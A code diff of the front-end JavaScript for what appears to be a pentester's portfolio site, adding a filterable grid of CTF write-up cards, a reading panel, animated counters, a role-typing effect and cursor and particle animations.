+    card.style.animation='cin .5s ease '+(i*0.08)+'s forwards';
+    card.innerHTML='<div class="wuacc"></div><div class="wubody"><div class="wutop"><span class="diff '+dCls(wu.difficulty)+'">'+wu.difficulty+'</span><span class="wuplat">'+wu.platform+'</span></div><div class="wutitle">'+wu.title+'</div><div class="wutags">'+wu.tags.map(function(t){return'<span class="wutag">'+t+'</span>';}).join('')+'</div><div class="wuexc">'+wu.excerpt+'</div><div class="wufoot"><span class="wudate">// '+wu.date+'</span><button class="wubtn" data-id="'+wu.id+'">leer &#8594;</button></div></div>';
+    card.querySelector('.wubtn').addEventListener('click',function(e){e.stopPropagation();openPanel(parseInt(this.dataset.id));});
+    grid.appendChild(card);
+  });
+}
+renderCards(WU);
+var panel=document.getElementById('panel'),overlay=document.getElementById('overlay');
+function openPanel(id){
+  var idx=filtered.findIndex(function(w){return w.id===id;});
+  if(idx===-1)return;
+  curIdx=idx;loadPanel(filtered[curIdx]);
+  panel.classList.add('open');overlay.classList.add('open');
+  document.body.style.overflow='hidden';
+}
+function loadPanel(wu){
+  document.getElementById('pPlat').textContent=wu.platform;
+  document.getElementById('pTitle').textContent=wu.title;
+  document.getElementById('pDate').textContent='// '+wu.date;
+  document.getElementById('curIdx').textContent=curIdx+1;
+  document.getElementById('totCount').textContent=filtered.length;
+  var d=document.getElementById('pDiff');
+  d.textContent=wu.difficulty;d.className='diff '+dCls(wu.difficulty);
+  document.getElementById('pTags').innerHTML=wu.tags.map(function(t){return'<span class="wutag">'+t+'</span>';}).join('');
+  var pc=document.getElementById('pcontent');
+  pc.innerHTML=wu.content;
+  pc.scrollTop=0;
+  document.getElementById('pprog').style.width='0%';
+  document.getElementById('prevBtn').disabled=curIdx===0;
+  document.getElementById('nextBtn').disabled=curIdx===filtered.length-1;
+}
+function closePanel(){panel.classList.remove('open');overlay.classList.remove('open');document.body.style.overflow='';}
+document.getElementById('pClose').addEventListener('click',closePanel);
+overlay.addEventListener('click',closePanel);
+document.addEventListener('keydown',function(e){if(e.key==='Escape')closePanel();});
+document.getElementById('prevBtn').addEventListener('click',function(){if(curIdx>0){curIdx--;loadPanel(filtered[curIdx]);}});
+document.getElementById('nextBtn').addEventListener('click',function(){if(curIdx<filtered.length-1){curIdx++;loadPanel(filtered[curIdx]);}});
+document.getElementById('pcontent').addEventListener('scroll',function(){
+  var pct=this.scrollTop/(this.scrollHeight-this.clientHeight)*100;
+  document.getElementById('pprog').style.width=Math.min(pct,100)+'%';
 });
-
-// Particles
-const pContainer = document.getElementById('particles');
-for(let i = 0; i < 25; i++) {
-  const p = document.createElement('div');
-  p.className = 'particle';
-  p.style.cssText = `
-    left: ${Math.random()*100}%;
-    --drift: ${(Math.random()-0.5)*80}px;
-    animation-duration: ${6+Math.random()*10}s;
-    animation-delay: ${Math.random()*10}s;
-    background: ${Math.random()>0.5 ? 'var(--cyan)' : 'var(--magenta)'};
-    width: ${Math.random()>0.7 ? '3px' : '2px'};
-    height: ${Math.random()>0.7 ? '3px' : '2px'};
-  `;
-  pContainer.appendChild(p);
-}
-
-// Fade in on scroll
-const observer = new IntersectionObserver(entries => {
-  entries.forEach((e, i) => {
-    if(e.isIntersecting) {
-      setTimeout(() => e.target.classList.add('visible'), i * 100);
-    }
+function applyFilters(){
+  var act=document.querySelector('.fbtn.active').dataset.f;
+  var q=document.getElementById('srch').value.toLowerCase();
+  filtered=WU.filter(function(w){
+    return (act==='all'||w.difficulty===act)&&(!q||w.title.toLowerCase().includes(q)||w.tags.some(function(t){return t.toLowerCase().includes(q);}));
   });
-}, { threshold: 0.1 });
-document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
-
-// Counters
-function animateCounter(el, target, suffix='') {
-  let start = 0;
-  const step = target / 60;
-  const timer = setInterval(() => {
-    start += step;
-    if(start >= target) { start = target; clearInterval(timer); }
-    el.textContent = Math.floor(start) + suffix;
-  }, 25);
+  renderCards(filtered);
 }
-const counterObserver = new IntersectionObserver(entries => {
-  entries.forEach(e => {
-    if(e.isIntersecting) {
-      animateCounter(document.getElementById('counterCerts'), 4);
-      animateCounter(document.getElementById('counterCTF'), 50, '+');
-      animateCounter(document.getElementById('counterWU'), 12);
-      counterObserver.disconnect();
-    }
+document.querySelectorAll('.fbtn').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    document.querySelectorAll('.fbtn').forEach(function(b){b.classList.remove('active');});
+    this.classList.add('active');applyFilters();
   });
-}, { threshold: 0.5 });
-counterObserver.observe(document.getElementById('counterCerts'));
-
-// Role typing effect
-const roles = ['Pentester', 'CTF Player', 'Bug Hunter', 'Red Teamer'];
-let ri = 0, ci = 0, deleting = false;
-const roleEl = document.getElementById('roleText');
-function typeRole() {
-  const current = roles[ri];
-  if(!deleting) {
-    roleEl.textContent = current.slice(0, ci+1);
-    ci++;
-    if(ci === current.length) { deleting = true; setTimeout(typeRole, 2000); return; }
-  } else {
-    roleEl.textContent = current.slice(0, ci-1);
-    ci--;
-    if(ci === 0) { deleting = false; ri = (ri+1)%roles.length; }
-  }
-  setTimeout(typeRole, deleting ? 50 : 100);
+});
+document.getElementById('srch').addEventListener('input',applyFilters);
+function animCount(el,target,suffix){
+  suffix=suffix||'';var v=0,step=target/55;
+  var t=setInterval(function(){v+=step;if(v>=target){v=target;clearInterval(t);}el.textContent=Math.floor(v)+suffix;},22);
 }
-typeRole();
+var cObs=new IntersectionObserver(function(entries){
+  entries.forEach(function(e){if(e.isIntersecting){animCount(document.getElementById('sCerts'),2);animCount(document.getElementById('sWU'),10);animCount(document.getElementById('sPwn'),25,'+');cObs.disconnect();}});
+},{threshold:.5});
+cObs.observe(document.getElementById('sCerts'));
+var roles=['Pentester','CTF Player','AD Attacker','Bug Hunter','Red Teamer'];
+var ri=0,ci=0,del=false,rEl=document.getElementById('roleText');
+function typeR(){
+  var cur=roles[ri];
+  if(!del){rEl.textContent=cur.slice(0,ci+1);ci++;if(ci===cur.length){del=true;setTimeout(typeR,1800);return;}}
+  else{rEl.textContent=cur.slice(0,ci-1);ci--;if(ci===0){del=false;ri=(ri+1)%roles.length;}}
+  setTimeout(typeR,del?45:95);
+}
+typeR();
+var obs=new IntersectionObserver(function(entries){entries.forEach(function(e,i){if(e.isIntersecting)setTimeout(function(){e.target.classList.add('vis');},i*80);});},{threshold:.1});
+document.querySelectorAll('.fi').forEach(function(el){obs.observe(el);});
+var pc2=document.getElementById('ptc');
+for(var i=0;i<22;i++){var p=document.createElement('div');p.className='pt';p.style.left=Math.random()*100+'%';p.style.setProperty('--d',(Math.random()-.5)*70+'px');p.style.animationDuration=(7+Math.random()*10)+'s';p.style.animationDelay=(Math.random()*12)+'s';p.style.background=Math.random()>.5?'var(--c)':'var(--m)';pc2.appendChild(p);}
+var cur2=document.getElementById('cur'),crng=document.getElementById('curRing'),mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove',function(e){mx=e.clientX;my=e.clientY;cur2.style.left=mx+'px';cur2.style.top=my+'px';});
+function animR2(){rx+=(mx-rx)*.11;ry+=(my-ry)*.11;crng.style.left=rx+'px';crng.style.top=ry+'px';requestAnimationFrame(animR2);}
+animR2();
 </script>
 </body>
 </html>
